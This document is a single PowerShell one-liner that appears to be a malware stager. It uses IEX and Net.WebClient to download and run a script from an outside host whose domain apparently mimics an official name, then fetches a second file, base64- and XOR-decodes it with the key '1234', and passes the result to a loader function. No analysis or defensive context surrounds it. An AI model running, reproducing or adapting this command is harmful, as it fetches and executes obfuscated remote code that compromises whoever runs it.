
$i = 0; $k = '1234'; IEX((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));Test-Querty -Querty ([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force

